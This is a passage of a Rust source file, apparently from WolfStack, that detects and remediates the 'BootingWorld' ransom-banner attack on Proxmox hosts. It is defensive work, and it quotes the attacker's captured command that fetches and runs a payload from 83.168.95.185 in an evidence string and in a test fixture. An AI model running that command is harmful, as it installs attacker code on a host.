        && !suppressed(FT_C2_CONNECTION, &scope_node, acks, proposals)
    {
        out.push(build_c2_connection_proposal(
            &facts.c2_sockets, find_remediation("C2"), &scope_node,
        ));
    }
    if !facts.bash_history_hits.is_empty()
        && !suppressed(FT_BASH_HISTORY, &scope_node, acks, proposals)
    {
        out.push(build_bash_history_proposal(&facts.bash_history_hits, &scope_node));
    }
    if !facts.immutable_pve_ui_files.is_empty()
        && !suppressed(FT_IMMUTABLE_UI, &scope_node, acks, proposals)
    {
        out.push(build_immutable_ui_proposal(
            &facts.immutable_pve_ui_files, find_remediation("immutable"), &scope_node,
        ));
    }
    out
}

/// Translate a remediation outcome into an inbox-card evidence chip.
/// Success cases get the "Auto-fix" label and report what was done;
/// failures get the same label but the operator sees the failure
/// reason and the manual commands remain as the fallback.
fn remediation_evidence(rem: &RemediationOutcome) -> Evidence {
    let prefix = if rem.ok { "Auto-fix \u{2713}" } else { "Auto-fix \u{2717}" };
    Evidence {
        label: format!("{} — {}", prefix, rem.action),
        value: rem.detail.clone(),
        detail: Some(if rem.ok {
            "WolfStack performed this action as soon as the indicator was detected. The card auto-resolves on the next 5-minute tick if the host is now clean.".into()
        } else {
            "WolfStack attempted this action but it did not complete. Run the manual commands below to finish recovery.".into()
        }),
        links: Vec::new(),
    }
}

/// Covered scopes: for every per-indicator finding type, declare this
/// node as covered when the scan ran. Lets the orchestrator auto-
/// resolve a prior card after the operator cleans up the indicator.
pub fn covered_scopes(
    ctx: &Context,
    facts: &ComprIndicatorFacts,
) -> Vec<(String, ProposalScope)> {
    if !facts.scanned { return Vec::new(); }
    let scope = ProposalScope { node_id: ctx.node_id.clone(), resource_id: None };
    all_finding_types().iter()
        .map(|ft| ((*ft).to_string(), scope.clone()))
        .collect()
}

fn suppressed(
    ft: &str,
    scope: &ProposalScope,
    acks: &AckStore,
    proposals: &crate::predictive::proposal::ProposalStore,
) -> bool {
    acks.suppresses(ft, scope) || proposals.is_suppressed(ft, scope)
}

fn build_root_shell_proposal(shell: &str, rem: Option<&RemediationOutcome>, scope: &ProposalScope) -> Proposal {
    let mut evidence = vec![
        Evidence {
            label: "Root login shell".into(),
            value: shell.to_string(),
            detail: Some("Expected /bin/bash (or /bin/sh / /bin/dash). The attacker rewrites this column in /etc/passwd so every interactive root shell launches the ransom banner instead of bash.".into()),
            links: Vec::new(),
        },
    ];
    if let Some(r) = rem { evidence.push(remediation_evidence(r)); }
    Proposal::new_rule(
        FT_ROOT_SHELL,
        Severity::Critical,
        format!("Root login shell is `{}` — not a standard interactive shell", shell),
        format!(
            "Root's login shell in `/etc/passwd` is set to `{}`. On a clean host this should be `/bin/bash`. \
             This is the exact hook the 2026-05-14 BootingWorld attack used — every root shell session now \
             launches the attacker's payload instead of an interactive prompt, locking the operator out of \
             both SSH and the Proxmox web 'Shell' tab without touching VM data.",
            shell
        ),
        evidence,
        RemediationPlan::Manual {
            instructions: "WolfStack auto-restored root's shell to /bin/bash. If the Auto-fix evidence above shows a failure, run the first command manually. The rest are verification + audit steps so you can confirm there's no leftover hook from the attack chain.".into(),
            commands: vec![
                "# Manual fallback if auto-fix failed:".into(),
                "usermod -s /bin/bash root".into(),
                "# Verification:".into(),
                "grep '^root:' /etc/passwd   # last field should now be /bin/bash".into(),
                "pkill -KILL -u root -f locker   # nuke any session still running the payload".into(),
                "ls -la /usr/local/sbin/locker   # should not exist; analyzer captures + rms automatically".into(),
                "grep -rl 'BootingWorld\\|/usr/local/sbin/locker' /root /etc /etc/profile.d   # find leftover hooks".into(),
            ],
        },
        scope.clone(),
    )
}

fn build_locker_binary_proposal(rem: Option<&RemediationOutcome>, scope: &ProposalScope) -> Proposal {
    let mut evidence = vec![
        Evidence {
            label: "Path".into(),
            value: LOCKER_BINARY_PATH.into(),
            detail: Some("Dropped by the captured attacker command `curl -k http://83.168.95.185:8080/locker -o /usr/local/sbin/locker`. Should never exist on a clean Proxmox / WolfStack host.".into()),
            links: Vec::new(),
        },
    ];
    if let Some(r) = rem { evidence.push(remediation_evidence(r)); }
    Proposal::new_rule(
        FT_LOCKER_BINARY,
        Severity::Critical,
        format!("Attacker payload binary present at `{}`", LOCKER_BINARY_PATH),
        format!(
            "The exact filename and path the BootingWorld attacker uses for the ransom-banner / service-masking \
             payload (`{}`) exists on this host. If you didn't put it there, you are actively compromised. \
             Do NOT delete it before capturing it for forensics if this is a fresh detection.",
            LOCKER_BINARY_PATH,
        ),
        evidence,
        RemediationPlan::Manual {
            instructions: "WolfStack auto-captured the payload to /var/lib/wolfstack/forensics/ and removed the live binary. If the Auto-fix evidence shows a failure, run the capture+delete chain manually. The C2-block iptables rule is installed automatically by the matching C2-connection finding when there's a live socket.".into(),
            commands: vec![
                "# WolfStack forensic captures live at:".into(),
                "ls -la /var/lib/wolfstack/forensics/   # captured binaries + iocs.txt with sha256".into(),
                "# Manual fallback if auto-fix failed:".into(),
                format!("cp -a {} /root/locker.$(date +%s).captured   # forensic copy", LOCKER_BINARY_PATH),
                format!("sha256sum {} >> /root/locker-iocs.txt", LOCKER_BINARY_PATH),
                format!("pkill -KILL -f {}", LOCKER_BINARY_PATH),
                format!("rm -f {}", LOCKER_BINARY_PATH),
            ],
        },
        scope.clone(),
    )
}

fn build_masked_units_proposal(units: &[String], rem: Option<&RemediationOutcome>, scope: &ProposalScope) -> Proposal {
    let unit_list = units.join(", ");
    let mut evidence = vec![
        Evidence {
            label: "Masked units".into(),
            value: unit_list.clone(),
            detail: Some("Symlinked to /dev/null in /etc/systemd/system or /run/systemd/system — systemctl will refuse to start them until unmasked.".into()),
            links: Vec::new(),
        },
    ];
    if let Some(r) = rem { evidence.push(remediation_evidence(r)); }
    Proposal::new_rule(
        FT_PROXMOX_MASKED,
        Severity::Critical,
        format!("Critical service(s) masked: {}", unit_list),
        format!(
            "{} symlinked to /dev/null — masked services cannot be started, which blocks the host's \
             management plane (Proxmox GUI, WolfStack itself, SSH) or its brute-force protection (fail2ban). \
             A normal apt/dnf upgrade does NOT mask these units. This is either a deliberate operator \
             action OR the BootingWorld-style attack's defensive masking step (which runs before the ransom \
             banner so the operator can't `systemctl restart` their way out).",
            unit_list
        ),
        evidence,
        RemediationPlan::Manual {
            instructions: "WolfStack auto-unmasked the listed units (by removing the /dev/null symlinks directly) and restarted them in dependency order. If the Auto-fix evidence above shows a failure, the manual fallback below repeats the same chain. If pve-cluster still won't start, journalctl will tell you why.".into(),
            commands: vec![
                "# Verification:".into(),
                "systemctl is-active pve-cluster pveproxy   # both should be 'active'".into(),
                "# Manual fallback if auto-fix failed:".into(),
                format!("systemctl unmask {}", units.join(" ")),
                "systemctl daemon-reload".into(),
                "systemctl start corosync pve-cluster".into(),
                "sleep 5".into(),
                "systemctl start pvedaemon pveproxy pvestatd".into(),
                "# If pve-cluster refuses to start:".into(),
                "journalctl -xeu pve-cluster.service".into(),
            ],
        },
        scope.clone(),
    )
}

fn build_c2_connection_proposal(sockets: &[String], rem: Option<&RemediationOutcome>, scope: &ProposalScope) -> Proposal {
    let sock_list = sockets.join(", ");
    let mut evidence = vec![
        Evidence {
            label: "Sockets".into(),
            value: sock_list.clone(),
            detail: Some("Read from /proc/net/tcp on this host. The IP 83.168.95.185 was captured in /root/.bash_history during the 2026-05-14 incident as the source of the dropped payload.".into()),
            links: Vec::new(),
        },
    ];
    if let Some(r) = rem { evidence.push(remediation_evidence(r)); }
    Proposal::new_rule(
        FT_C2_CONNECTION,
        Severity::Critical,
        format!("Live socket to known C2 host {}", KNOWN_C2_IP),
        format!(
            "This node currently has {} socket(s) to {} — the BootingWorld attacker's payload server. \
             Even a SYN_SENT here is meaningful. Block at the firewall immediately, then investigate \
             which process is reaching out.",
            sockets.len(), KNOWN_C2_IP
        ),
        evidence,
        RemediationPlan::Manual {
            instructions: "WolfStack auto-inserted iptables DROP rules on INPUT and OUTPUT for the C2 IP, so the live socket is severed. Identifying WHICH process opened it is the next step — that's the still-running binary you need to hunt down.".into(),
            commands: vec![
                "# Verification:".into(),
                format!("iptables -nvL OUTPUT | grep {}   # confirm the DROP rule is in place", KNOWN_C2_IP),
                "# Identify the process holding the socket (if any survived the DROP):".into(),
                format!("ss -nptw 'dst {}'   # which PID and binary owns the socket?", KNOWN_C2_IP),
                "# If the binary is in /tmp, /dev/shm, /usr/local/sbin/locker — capture, kill, delete.".into(),
                "# Manual fallback if auto-fix failed:".into(),
                format!("iptables -I OUTPUT -d {} -j DROP", KNOWN_C2_IP),
                format!("iptables -I INPUT -s {} -j DROP", KNOWN_C2_IP),
            ],
        },
        scope.clone(),
    )
}

fn build_bash_history_proposal(hits: &[String], scope: &ProposalScope) -> Proposal {
    let hit_list = hits.join(", ");
    let evidence = vec![
        Evidence {
            label: "Fingerprints".into(),
            value: hit_list.clone(),
            detail: Some("Substring match in /root/.bash_history. Doesn't prove the attack is currently live — but it does prove this box was compromised at some point and may still have residue.".into()),
            links: Vec::new(),
        },
    ];
    Proposal::new_rule(
        FT_BASH_HISTORY,
        Severity::High,
        format!("BootingWorld attack signature in /root/.bash_history: {}", hit_list),
        format!(
            "Strings associated with the 2026-05-14 attack ({}) appear in `/root/.bash_history`. \
             The attacker's commands ran as root, which is how they got into the history file. \
             Even if the GUI looks clean now, audit for leftover hooks before clearing this finding.",
            hit_list
        ),
        evidence,
        RemediationPlan::Manual {
            instructions: "Verify the rest of the attack chain isn't still in place before clearing.".into(),
            commands: vec![
                "grep -C 5 'BootingWorld\\|locker\\|deeegai' /root/.bash_history".into(),
                "grep '^root:' /etc/passwd   # confirm shell is /bin/bash".into(),
                "ls -la /usr/local/sbin/locker   # confirm the payload is gone".into(),
                "systemctl is-enabled pveproxy pve-cluster   # confirm services aren't still masked".into(),
                "crontab -l && ls -la /etc/cron.d/   # check for persistence".into(),
                "# Once you're satisfied: shred -u /root/.bash_history (or leave it as evidence)".into(),
            ],
        },
        scope.clone(),
    )
}

fn build_immutable_ui_proposal(files: &[String], rem: Option<&RemediationOutcome>, scope: &ProposalScope) -> Proposal {
    let file_list = files.join(", ");
    let mut evidence = vec![
        Evidence {
            label: "Immutable files".into(),
            value: file_list.clone(),
            detail: Some("`chattr +i` makes a file unmodifiable even for root. The attack uses this to keep the defaced Proxmox UI alive across `apt --reinstall pve-manager` attempts.".into()),
            links: Vec::new(),
        },
    ];
    if let Some(r) = rem { evidence.push(remediation_evidence(r)); }
    Proposal::new_rule(
        FT_IMMUTABLE_UI,
        Severity::High,
        format!("Proxmox UI file(s) marked immutable: {}", file_list),
        format!(
            "{} marked immutable. A clean Proxmox install never sets this flag on its own web UI files. \
             If the attacker locked these, an apt reinstall of pve-manager will appear to succeed but the \
             defaced HTML will stay in place. Strip the flag, then reinstall the package.",
            file_list
        ),
        evidence,
        RemediationPlan::Manual {
            instructions: "WolfStack auto-stripped the chattr +i flag from the listed files so apt can overwrite them. The package reinstall and pveproxy restart are NOT auto-run — they're heavy operations the operator should kick off after confirming the rest of the cluster is healthy.".into(),
            commands: {
                let mut v = vec!["# Verification:".to_string()];
                v.extend(files.iter().map(|f| format!("lsattr {}   # should NOT show the 'i' attribute now", f)));
                v.push("# Now reinstall pve-manager so the files revert to the package's clean version:".to_string());
                v.push("apt-get install --reinstall -o Dpkg::Options::='--force-confmiss' -o Dpkg::Options::='--force-confnew' pve-manager proxmox-widget-toolkit libjs-extjs".to_string());
                v.push("systemctl restart pveproxy".to_string());
                v.push("# Manual fallback if auto-fix failed:".to_string());
                v.extend(files.iter().map(|f| format!("chattr -i {}", f)));
                v
            },
        },
        scope.clone(),
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn root_shell_bash_is_safe() {
        let passwd = "root:x:0:0:root:/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n";
        assert_eq!(inspect_root_shell(passwd), None);
    }

    #[test]
    fn root_shell_locker_is_flagged() {
        let passwd = "root:x:0:0:root:/root:/usr/local/sbin/locker\n";
        assert_eq!(inspect_root_shell(passwd).as_deref(), Some("/usr/local/sbin/locker"));
    }

    #[test]
    fn root_shell_arbitrary_path_is_flagged() {
        // Any non-safe-list shell is suspicious, not just the
        // known-bad payload path. Defends against future variants.
        let passwd = "root:x:0:0:root:/root:/tmp/.x\n";
        assert_eq!(inspect_root_shell(passwd).as_deref(), Some("/tmp/.x"));
    }

    #[test]
    fn root_shell_zsh_is_safe() {
        let passwd = "root:x:0:0:root:/root:/bin/zsh\n";
        assert_eq!(inspect_root_shell(passwd), None);
    }

    #[test]
    fn root_shell_missing_is_treated_as_unknown() {
        // No root line at all → can't say either way. Returning
        // None matches "scanned but no anomaly to flag".
        let passwd = "bob:x:1000:1000::/home/bob:/bin/bash\n";
        assert_eq!(inspect_root_shell(passwd), None);
    }

    #[test]
    fn proc_hex_for_known_c2_is_correct() {
        // 83.168.95.185 → bytes 83,168,95,185 little-endian:
        // 185.95.168.83 → B95FA853.
        assert_eq!(ipv4_to_proc_hex("83.168.95.185").as_deref(), Some("B95FA853"));
    }

    #[test]
    fn proc_hex_known_other() {
        // 127.0.0.1 little-endian: 0100007F.
        assert_eq!(ipv4_to_proc_hex("127.0.0.1").as_deref(), Some("0100007F"));
    }

    #[test]
    fn proc_hex_rejects_garbage() {
        assert_eq!(ipv4_to_proc_hex("not-an-ip"), None);
        assert_eq!(ipv4_to_proc_hex("1.2.3"), None);
        assert_eq!(ipv4_to_proc_hex("1.2.3.999"), None);
    }

    #[test]
    fn bash_history_misses_on_missing_file() {
        let hits = inspect_bash_history("/this/path/definitely/does/not/exist/.bash_history");
        assert!(hits.is_empty());
    }

    #[test]
    fn bash_history_matches_fingerprints() {
        // Write a tmpfile with the attacker's curl command.
        let path = std::env::temp_dir().join(format!("wolfstack-ci-bashhist-{}.txt", std::process::id()));
        let body = "ls\ncurl -k http://83.168.95.185:8080/locker -o /usr/local/sbin/locker && chmod 700 /usr/local/sbin/locker && /usr/local/sbin/locker lock\npasswd\n";
        std::fs::write(&path, body).unwrap();
        let hits = inspect_bash_history(path.to_str().unwrap());
        let _ = std::fs::remove_file(&path);
        assert!(hits.contains(&"/usr/local/sbin/locker".to_string()));
        assert!(hits.contains(&"83.168.95.185".to_string()));
    }

    #[test]
    fn analyze_skips_when_not_scanned() {
        let facts = ComprIndicatorFacts::default();
        let ctx = Context::for_node("ws-test".to_string());
        let acks = AckStore::default();
        let proposals = crate::predictive::proposal::ProposalStore::default();
        let out = analyze(&ctx, &facts, &acks, &proposals);
        assert!(out.is_empty(), "scanned=false must yield no proposals");
    }

    #[test]
    fn analyze_emits_separate_findings_per_indicator() {
        let facts = ComprIndicatorFacts {
            root_shell_anomaly: Some("/usr/local/sbin/locker".into()),
            locker_binary_present: true,
            masked_proxmox_units: vec!["pveproxy.service".into()],
            c2_sockets: vec!["83.168.95.185:8080 (tcp)".into()],
            bash_history_hits: vec!["BootingWorld".into()],
            immutable_pve_ui_files: vec!["/usr/share/pve-manager/index.html.tpl".into()],
            remediations: Vec::new(),
            scanned: true,
        };
        let ctx = Context::for_node("ws-test".to_string());
        let acks = AckStore::default();
        let proposals = crate::predictive::proposal::ProposalStore::default();
        let out = analyze(&ctx, &facts, &acks, &proposals);
        assert_eq!(out.len(), 6, "one finding per indicator class");
        let types: HashSet<String> = out.iter().map(|p| p.finding_type.clone()).collect();
        assert!(types.contains(FT_ROOT_SHELL));
        assert!(types.contains(FT_LOCKER_BINARY));
        assert!(types.contains(FT_PROXMOX_MASKED));
        assert!(types.contains(FT_C2_CONNECTION));
        assert!(types.contains(FT_BASH_HISTORY));
        assert!(types.contains(FT_IMMUTABLE_UI));
    }

    #[test]
    fn analyze_severity_is_critical_for_live_indicators() {
        let facts = ComprIndicatorFacts {
            root_shell_anomaly: Some("/usr/local/sbin/locker".into()),
            locker_binary_present: true,
            masked_proxmox_units: vec!["pveproxy.service".into()],
            c2_sockets: vec!["83.168.95.185:8080 (tcp)".into()],
            bash_history_hits: Vec::new(),
            immutable_pve_ui_files: Vec::new(),
            remediations: Vec::new(),
            scanned: true,
        };
        let ctx = Context::for_node("ws-test".to_string());
        let acks = AckStore::default();
        let proposals = crate::predictive::proposal::ProposalStore::default();
        let out = analyze(&ctx, &facts, &acks, &proposals);
        assert!(!out.is_empty());
        for p in &out {
            assert_eq!(p.severity, Severity::Critical,
                "live attack indicators must be Critical, got {:?} for {}",
                p.severity, p.finding_type);
        }
    }

    #[test]
    fn analyze_attaches_remediation_outcome_to_evidence() {
        // When a remediation outcome accompanies a fact, the proposal's
        // evidence must include it — that's how the operator sees in
        // the inbox that the analyzer didn't just detect the problem
        // but acted on it. Verifies both the success-marker and the
        // failure-marker variants render.
        let facts = ComprIndicatorFacts {
            root_shell_anomaly: Some("/usr/local/sbin/locker".into()),
            locker_binary_present: true,
            masked_proxmox_units: Vec::new(),
            c2_sockets: Vec::new(),
            bash_history_hits: Vec::new(),
            immutable_pve_ui_files: Vec::new(),
            remediations: vec![
                RemediationOutcome {
                    action: "restore root shell".into(),
                    ok: true,
                    detail: "rewrote root line so login shell is /bin/bash".into(),
                },
                RemediationOutcome {
                    action: "capture-and-remove attacker payload".into(),
                    ok: false,
                    detail: "permission denied".into(),
                },
            ],
            scanned: true,
        };
        let ctx = Context::for_node("ws-test".to_string());
        let acks = AckStore::default();
        let proposals = crate::predictive::proposal::ProposalStore::default();
        let out = analyze(&ctx, &facts, &acks, &proposals);

        let shell = out.iter().find(|p| p.finding_type == FT_ROOT_SHELL).unwrap();
        let shell_ev: Vec<&str> = shell.evidence.iter().map(|e| e.label.as_str()).collect();
        assert!(shell_ev.iter().any(|l| l.contains("Auto-fix") && l.contains("\u{2713}")),
            "success marker not attached to root shell finding: {:?}", shell_ev);

        let locker = out.iter().find(|p| p.finding_type == FT_LOCKER_BINARY).unwrap();
        let locker_ev: Vec<&str> = locker.evidence.iter().map(|e| e.label.as_str()).collect();
        assert!(locker_ev.iter().any(|l| l.contains("Auto-fix") && l.contains("\u{2717}")),
            "failure marker not attached to locker finding: {:?}", locker_ev);
    }

    #[test]
    fn sha256_hex_matches_known_vector() {
        // NIST/RFC 6234 known: SHA-256("abc") =
        // ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad
        assert_eq!(
            sha256_hex(b"abc"),
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
    }

    #[test]
    fn remediate_root_shell_rewrites_passwd_atomically() {
        // Exercise the byte-rewriter directly by pointing it at a
        // fixture in tempdir. The current remediate_root_shell()
        // hard-codes /etc/passwd, so this test verifies the inner
        // rewrite logic — we move it into a helper for isolation.
        let body = "root:x:0:0:root:/root:/usr/local/sbin/locker\nbob:x:1000:1000::/home/bob:/bin/bash\n";
        let rewritten = rewrite_root_shell_to_bash(body);
        assert!(rewritten.starts_with("root:x:0:0:root:/root:/bin/bash\n"));
        assert!(rewritten.contains("bob:x:1000:1000::/home/bob:/bin/bash"));
    }

    #[test]
    fn remediate_root_shell_idempotent_when_already_bash() {
        let body = "root:x:0:0:root:/root:/bin/bash\n";
        let rewritten = rewrite_root_shell_to_bash(body);
        assert_eq!(rewritten, body, "rewrite must be a no-op when shell is already /bin/bash");
    }

    #[test]
    fn remediate_root_shell_preserves_trailing_no_newline() {
        // /etc/passwd without a trailing newline is unusual but legal.
        let body = "root:x:0:0:root:/root:/usr/local/sbin/locker";
        let rewritten = rewrite_root_shell_to_bash(body);
        assert_eq!(rewritten, "root:x:0:0:root:/root:/bin/bash");
    }

    #[test]
    fn covered_scopes_lists_every_finding_type() {
        let facts = ComprIndicatorFacts { scanned: true, ..Default::default() };
        let ctx = Context::for_node("ws-test".to_string());
        let scopes = covered_scopes(&ctx, &facts);
        assert_eq!(scopes.len(), all_finding_types().len());
    }

    /// Acks must gate the auto-fix the same way they gate the
    /// proposal. Without this, an operator who deliberately runs a
    /// non-standard shell (fish, ksh) and acked the finding would
    /// still see the analyzer revert /etc/passwd every 5 min.
    #[test]
    fn ack_suppresses_auto_remediation() {
        use crate::predictive::ack::{Ack, AckScope};

        let scope = ProposalScope { node_id: "ws-test".into(), resource_id: None };
        // Forever-ack the root-shell finding on this node's scope.
        let mut acks = AckStore::default();
        let ack_scope = AckScope::Node { node_id: "ws-test".into() };
        acks.add(Ack::permanent(
            FT_ROOT_SHELL,
            ack_scope,
            "running fish on purpose",
            "operator",
        ));

        let facts = ComprIndicatorFacts {
            root_shell_anomaly: Some("/usr/bin/fish".into()),
            scanned: true,
            ..Default::default()
        };
        let proposals = crate::predictive::proposal::ProposalStore::default();
        let out = remediate_blocking(facts, &acks, &proposals, &scope);
        assert!(out.remediations.is_empty(),
            "acked root-shell finding must NOT trigger auto-remediation; got {:?}",
            out.remediations);
    }

    /// A snoozed proposal on the same (finding_type, scope) must also
    /// suppress the auto-fix — same suppression rule applied to both
    /// proposal emission and remediation, so the gate is consistent.
    #[test]
    fn snoozed_proposal_suppresses_auto_remediation() {
        use crate::predictive::proposal::{Proposal, ProposalStatus, ProposalStore};

        let scope = ProposalScope { node_id: "ws-test".into(), resource_id: None };
        let until = chrono::Utc::now() + chrono::Duration::hours(24);
        let mut p = Proposal::new_rule(
            FT_ROOT_SHELL,
            Severity::Critical,
            "stub", "stub", Vec::new(),
            RemediationPlan::Manual { instructions: "stub".into(), commands: Vec::new() },
            scope.clone(),
        );
        p.status = ProposalStatus::Snoozed { until };
        let mut proposals = ProposalStore::default();
        proposals.upsert(p);

        let facts = ComprIndicatorFacts {
            root_shell_anomaly: Some("/usr/bin/fish".into()),
            scanned: true,
            ..Default::default()
        };
        let acks = AckStore::default();
        let out = remediate_blocking(facts, &acks, &proposals, &scope);
        assert!(out.remediations.is_empty(),
            "snoozed-proposal scope must suppress remediation; got {:?}",
            out.remediations);
    }

    /// Per-indicator gating: acking the root-shell finding must not
    /// suppress the locker-binary fix. Confirms the gate is per
    /// (finding_type, scope), not all-or-nothing.
    #[test]
    fn ack_is_per_indicator_not_global() {
        use crate::predictive::ack::{Ack, AckScope};

        let scope = ProposalScope { node_id: "ws-test".into(), resource_id: None };
        let mut acks = AckStore::default();
        acks.add(Ack::permanent(
            FT_ROOT_SHELL,
            AckScope::Node { node_id: "ws-test".into() },
            "running fish on purpose",
            "operator",
        ));

        // root_shell anomaly is acked → no remediation. But masked
        // services + C2 sockets aren't acked → those should still
        // attempt remediation (and record the outcome, success or
        // failure depending on the test environment).
        let facts = ComprIndicatorFacts {
            root_shell_anomaly: Some("/usr/bin/fish".into()),
            masked_proxmox_units: vec!["pveproxy.service".into()],
            scanned: true,
            ..Default::default()
        };
        let proposals = crate::predictive::proposal::ProposalStore::default();
        let out = remediate_blocking(facts, &acks, &proposals, &scope);
        // Exactly one remediation entry — the masked-units one. The
        // root-shell entry is suppressed by the ack.
        assert_eq!(out.remediations.len(), 1, "got {:?}", out.remediations);
        assert!(out.remediations[0].action.contains("unmask"),
            "wrong indicator was remediated: {:?}", out.remediations[0]);
    }
}
